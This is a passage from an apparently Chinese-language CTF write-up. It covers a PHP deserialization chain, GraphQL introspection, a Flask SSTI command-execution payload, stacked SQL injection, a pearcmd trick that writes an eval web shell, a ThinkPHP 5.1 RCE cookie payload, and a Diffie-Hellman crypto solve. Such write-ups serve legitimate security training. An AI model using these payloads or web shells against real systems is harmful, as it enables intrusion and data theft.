</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Easy</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cla</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$cla</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cla</span> <span class=o>=</span> <span class=nv>$cla</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>eeee</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$obj</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$Sec1</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sec</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$Start1</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Start</span><span class=p>(</span><span class=s2>&#34;mof&#34;</span><span class=p>,</span><span class=nv>$Sec1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$eeee</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>eeee</span><span class=p>(</span><span class=nv>$Start1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$Easy</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Easy</span><span class=p>(</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$Sec2</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sec</span><span class=p>(</span><span class=nv>$Easy</span><span class=p>,</span><span class=nv>$eeee</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$Start2</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Start</span><span class=p>(</span><span class=nv>$Sec2</span><span class=p>,</span><span class=nv>$Sec2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$Start2</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><h4 id=ezapi>ezAPI</h4><p>御剑扫到www.zip源码</p><p>index.php</p><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;head&gt;
    &lt;meta charset=&#34;utf-8&#34; /&gt;
    &lt;title&gt;Search Page&lt;/title&gt;
    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;css/style.css&#34; tppabs=&#34;css/style.css&#34; /&gt;
    &lt;style&gt;
        body {
            height: 100%;
            background: #16a085;
            overflow: hidden;
        }

        canvas {
            z-index: -1;
            position: absolute;
        }
    &lt;/style&gt;
    &lt;script src=&#34;js/jquery.js&#34;&gt;&lt;/script&gt;
    &lt;script src=&#34;js/verificationNumbers.js&#34; tppabs=&#34;js/verificationNumbers.js&#34;&gt;&lt;/script&gt;
    &lt;script src=&#34;js/Particleground.js&#34; tppabs=&#34;js/Particleground.js&#34;&gt;&lt;/script&gt;
    &lt;script&gt;
        $(document).ready(function() {
            $(&#39;body&#39;).particleground({
                dotColor: &#39;#5cbdaa&#39;,
                lineColor: &#39;#5cbdaa&#39;
            });
        });ß
    &lt;/script&gt;
&lt;/head&gt;
&lt;!--unremove DEBUG function, please delete it--&gt;
&lt;body&gt;
    &lt;dl class=&#34;admin_login&#34;&gt;
        &lt;dt&gt;
            &lt;font color=&#34;white&#34;&gt;&lt;strong&gt;Search Page Beta&lt;/strong&gt;&lt;/font&gt;
        &lt;/dt&gt;
        &lt;form action=&#34;index.php&#34; method=&#34;post&#34;&gt;
            &lt;dd class=&#34;user_icon&#34;&gt;
                &lt;input type=&#34;text&#34; name=&#34;id&#34; placeholder=&#34;用户ID&#34; class=&#34;login_txtbx&#34; /&gt;
            &lt;/dd&gt;
            &lt;dd&gt;
                &lt;input type=&#34;submit&#34; value=&#34;Search&#34; class=&#34;submit_btn&#34; /&gt;
            &lt;/dd&gt;
        &lt;/form&gt;&lt;br&gt;
        &lt;center&gt;
            &lt;font size=&#34;4px&#34; color=&#34;white&#34;&gt;
                &lt;?php
                error_reporting(0);
                $id = $_POST[&#39;id&#39;];
                function waf($str)
                {
                    if (!is_numeric($str) || preg_replace(&#34;/[0-9]/&#34;, &#34;&#34;, $str) !== &#34;&#34;) {
                        return False;
                    } else {
                        return True;
                    }
                }

                function send($data)
                {
                    $options = array(
                        &#39;http&#39; =&gt; array(
                            &#39;method&#39; =&gt; &#39;POST&#39;,
                            &#39;header&#39; =&gt; &#39;Content-type: application/json&#39;,
                            &#39;content&#39; =&gt; $data,
                            &#39;timeout&#39; =&gt; 10 * 60
                        )
                    );
                    $context = stream_context_create($options);
                    $result = file_get_contents(&#34;http://graphql:8080/v1/graphql&#34;, false, $context);
                    return $result;
                }

                if (isset($id)) {
                    if (waf($id)) {
                        isset($_POST[&#39;data&#39;]) ? $data = $_POST[&#39;data&#39;] : $data = &#39;{&#34;query&#34;:&#34;query{\nusers_user_by_pk(id:&#39; . $id . &#39;) {\nname\n}\n}\n&#34;, &#34;variables&#34;:null}&#39;;
                        $res = json_decode(send($data));
                        if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL) {
                            echo &#34;ID: &#34; . $id . &#34;&lt;br&gt;Name: &#34; . $res-&gt;data-&gt;users_user_by_pk-&gt;name;
                        } else {
                            echo &#34;&lt;b&gt;Can&#39;t found it!&lt;/b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &#34;;
                            var_dump($res-&gt;data);
                        }
                    } else {
                        die(&#34;&lt;b&gt;Hacker! Only Number!&lt;/b&gt;&#34;);
                    }
                } else {
                    die(&#34;&lt;b&gt;No Data?&lt;/b&gt;&#34;);
                }
                ?&gt;
            &lt;/font&gt;
        &lt;/center&gt;
    &lt;/dl&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>发现使用$data进行graphQL查询</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=nv>$data</span> <span class=o>=</span> <span class=s1>&#39;{&#34;query&#34;:&#34;query{\nusers_user_by_pk(id:&#39;</span> <span class=o>.</span> <span class=nv>$id</span> <span class=o>.</span> <span class=s1>&#39;) {\nname\n}\n}\n&#34;, &#34;variables&#34;:null}&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p>参考：<a href=https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/ target=_blank rel="noopener noreffer">当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)</a></p><p>大体解析过程，是遇到一个Query就取值，对返回值解析，递归遍历</p><p>常见爆信息payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>query</span> <span class=nx>IntrospectionQuery</span><span class=p>{</span><span class=nx>__schema</span><span class=p>{</span><span class=nx>queryType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>mutationType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>subscriptionType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>types</span><span class=p>{</span><span class=o>...</span><span class=nx>FullType</span><span class=p>}</span><span class=nx>directives</span><span class=p>{</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>locations</span> <span class=nx>args</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}}}}</span><span class=nx>fragment</span> <span class=nx>FullType</span> <span class=nx>on</span> <span class=nx>__Type</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>description</span> <span class=nx>fields</span><span class=p>(</span><span class=nx>includeDeprecated</span><span class=o>:</span><span class=k>true</span><span class=p>){</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>args</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}</span><span class=nx>type</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>isDeprecated</span> <span class=nx>deprecationReason</span><span class=p>}</span><span class=nx>inputFields</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}</span><span class=nx>interfaces</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>enumValues</span><span class=p>(</span><span class=nx>includeDeprecated</span><span class=o>:</span><span class=k>true</span><span class=p>){</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>isDeprecated</span> <span class=nx>deprecationReason</span><span class=p>}</span><span class=nx>possibleTypes</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}}</span><span class=nx>fragment</span> <span class=nx>InputValue</span> <span class=nx>on</span> <span class=nx>__InputValue</span><span class=p>{</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>type</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>defaultValue</span><span class=p>}</span><span class=nx>fragment</span> <span class=nx>TypeRef</span> <span class=nx>on</span> <span class=nx>__Type</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span><span class=p>}}}}}}}}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>query</span> <span class=nx>IntrospectionQuery</span><span class=p>{</span><span class=nx>__schema</span><span class=p>{</span><span class=nx>queryType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>mutationType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>subscriptionType</span><span class=p>{</span><span class=nx>name</span><span class=p>}</span><span class=nx>types</span><span class=p>{</span><span class=o>...</span><span class=nx>FullType</span><span class=p>}</span><span class=nx>directives</span><span class=p>{</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>locations</span> <span class=nx>args</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}}}}</span><span class=nx>fragment</span> <span class=nx>FullType</span> <span class=nx>on</span> <span class=nx>__Type</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>description</span> <span class=nx>fields</span><span class=p>(</span><span class=nx>includeDeprecated</span><span class=o>:</span><span class=k>true</span><span class=p>){</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>args</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}</span><span class=nx>type</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>isDeprecated</span> <span class=nx>deprecationReason</span><span class=p>}</span><span class=nx>inputFields</span><span class=p>{</span><span class=o>...</span><span class=nx>InputValue</span><span class=p>}</span><span class=nx>interfaces</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>enumValues</span><span class=p>(</span><span class=nx>includeDeprecated</span><span class=o>:</span><span class=k>true</span><span class=p>){</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>isDeprecated</span> <span class=nx>deprecationReason</span><span class=p>}</span><span class=nx>possibleTypes</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}}</span><span class=nx>fragment</span> <span class=nx>InputValue</span> <span class=nx>on</span> <span class=nx>__InputValue</span><span class=p>{</span><span class=nx>name</span> <span class=nx>description</span> <span class=nx>type</span><span class=p>{</span><span class=o>...</span><span class=nx>TypeRef</span><span class=p>}</span><span class=nx>defaultValue</span><span class=p>}</span><span class=nx>fragment</span> <span class=nx>TypeRef</span> <span class=nx>on</span> <span class=nx>__Type</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span> <span class=nx>ofType</span><span class=p>{</span><span class=nx>kind</span> <span class=nx>name</span><span class=p>}}}}}}}}</span>
</span></span></code></pre></div><p>利用上述payload爆出信息，发现 ffffllllaaagggg_1n_h3r3_flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span><span class=o>=&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>28</span><span class=p>)</span> <span class=s2>&#34;ffffllllaaagggg_1n_h3r3_flag&#34;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=s2>&#34;description&#34;</span><span class=p>]</span><span class=o>=&gt;</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>59</span><span class=p>)</span> <span class=s2>&#34;columns and relationships of &#34;</span><span class=nx>ffffllllaaagggg_1n_h3r3</span><span class=o>.</span><span class=nx>flag</span><span class=s2>&#34;&#34;</span>
</span></span></code></pre></div><p>通过flag读取</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;query&#34;</span><span class=o>:</span><span class=s2>&#34;query {ffffllllaaagggg_1n_h3r3_flag{flag}}&#34;</span><span class=p>}</span>
</span></span></code></pre></div><h2 id=week3>week3</h2><h3 id=web-1>web</h3><h4 id=babyssti_one>BabySSTI_One</h4><p>flask ssti注入</p><p><a href=http://www.python88.com/topic/115601 target=_blank rel="noopener noreffer">Python安全 | Flask-jinja2 SSTI 利用手册 - Python社区 (python88.com)</a></p><p>思路：找到os，执行命令读取</p><p>绕过：|attr() 加 字符串拼接</p><p>payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?name<span class=o>=</span>%7B%7B<span class=o>()</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__cla&#34;</span>+<span class=s2>&#34;ss__&#34;</span><span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__bas&#34;</span>+<span class=s2>&#34;es__&#34;</span><span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__getitem__&#34;</span><span class=o>)(</span>0<span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__subcl&#34;</span>+<span class=s2>&#34;asses__&#34;</span><span class=o>)()</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__getitem__&#34;</span><span class=o>)(</span>117<span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__in&#34;</span>+<span class=s2>&#34;it__&#34;</span><span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__globals__&#34;</span><span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;__getitem__&#34;</span><span class=o>)(</span><span class=s2>&#34;popen&#34;</span><span class=o>)(</span><span class=s2>&#34;ca&#34;</span>+<span class=s2>&#34;t%20/fl&#34;</span>+<span class=s2>&#34;ag_in_here&#34;</span><span class=o>)</span><span class=p>|</span>attr<span class=o>(</span><span class=s2>&#34;read&#34;</span><span class=o>)()</span>%7D%7D
</span></span></code></pre></div><h4 id=multisql>multiSQL</h4><p>堆叠注入+update</p><p><a href=https://www.jianshu.com/p/36f0772f5ce8 target=_blank rel="noopener noreffer">BUUCTF-Web-随便注(三种解题思路) - 简书 (jianshu.com)</a></p><p>绕过：预处理语句 + concat字符串拼接</p><p>payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?username<span class=o>=</span>1<span class=s1>&#39; or &#39;&#39;=&#39;&#39;;SET @sql=concat(&#39;</span>up<span class=s1>&#39;,&#39;</span>date score SET <span class=nv>listen</span><span class=o>=</span>200<span class=err>&#39;</span><span class=o>)</span><span class=p>;</span>PREPARE jwt from @sql<span class=p>;</span>EXECUTE jwt<span class=p>;</span><span class=c1>#</span>
</span></span></code></pre></div><h4 id=includetwo>IncludeTwo</h4><p>percmd.php + rce</p><p><a href=http://landasika.top/2022/06/11/sourceless-guessy-web/ target=_blank rel="noopener noreffer">Sourceless Guessy Web (pearcmd+rce)</a></p><p>payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?file<span class=o>=</span>pearcmd<span class=p>&amp;</span>+config-create+/&lt;?<span class=o>=</span>@eval<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>])</span><span class=p>;</span>?&gt;+./cmd.php
</span></span></code></pre></div><p>中国蚁剑连接</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>url?file<span class=o>=</span>./cmd
</span></span><span class=line><span class=cl>cmd
</span></span></code></pre></div><h4 id=maybe-you-have-to-think-more>Maybe You Have To think More</h4><p><a href=https://www.freebuf.com/vuls/263977.html target=_blank rel="noopener noreffer">https://www.freebuf.com/vuls/263977.html</a>
thinkphp5.1.41 rce漏洞 + cookie
<a href=https://www.anquanke.com/post/id/241148 target=_blank rel="noopener noreffer">https://www.anquanke.com/post/id/241148</a>
linux proc获取环境变量信息发现flag</p><p>payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Cookie: <span class=nv>tp_user</span><span class=o>=</span><span class=nv>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0</span><span class=o>=</span>
</span></span><span class=line><span class=cl>?name<span class=o>=</span>cat%20/proc/self/environ
</span></span></code></pre></div><h3 id=crpto>crpto</h3><h4 id=keyexchange>keyExchange</h4><p>keyExchange.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>flag</span><span class=p>,</span> <span class=n>gb</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>Diffie_Hellman_KEY_EXCHANGE</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64encode</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>plaintext</span> <span class=o>=</span> <span class=n>pad</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shared</span> <span class=o>=</span> <span class=n>Diffie_Hellman_KEY_EXCHANGE</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=c1># the original one, not the elliptic curve version!!!!</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>shared</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;师傅给你送了一个flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;加密的flag = </span><span class=si>{</span><span class=n>b64encode</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;p = </span><span class=si>{</span><span class=n>p</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;your secret key </span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;g = </span><span class=si>{</span><span class=n>g</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;师傅的公钥 = </span><span class=si>{</span><span class=n>gb</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>output.txt</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>师傅给你送了一个flag</span>
</span></span><span class=line><span class=cl><span class=n>加密的flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913</span>
</span></span><span class=line><span class=cl><span class=n>your</span> <span class=n>secret</span> <span class=n>key</span> <span class=mi>141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185</span>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>师傅的公钥</span> <span class=o>=</span> <span class=mi>89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382</span>
</span></span></code></pre></div><p>DH秘钥交换方法</p><ol><li>Alice，Bob事先约定参数：素数p，⽣成元g</li><li>Alice私钥skA，公钥pkA=gskA；Bob私钥skB，公钥pkB=gskB</li><li>进⾏密钥交换时，计算share=pkAskB=pkBskA=g^(skA*skB)</li></ol><p>题⽬中给出了⼀⽅的公钥与另⼀⽅的私钥，直接计算可以得到交换密钥</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913</span>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>gb</span> <span class=o>=</span> <span class=mi>89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH&#39;</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>K</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>gb</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>K</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
